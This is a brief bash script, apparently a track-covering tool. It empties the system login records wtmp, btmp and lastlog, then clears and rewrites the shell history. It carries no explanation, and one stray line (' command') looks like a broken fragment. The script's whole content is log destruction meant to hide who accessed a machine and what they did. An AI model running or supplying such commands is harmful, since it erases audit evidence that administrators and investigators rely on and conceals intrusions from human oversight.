#!/bin/bash

echo > /var/log/wtmp
echo > /var/log/btmp
echo > /var/log/lastlog
 command
history -r
history -cw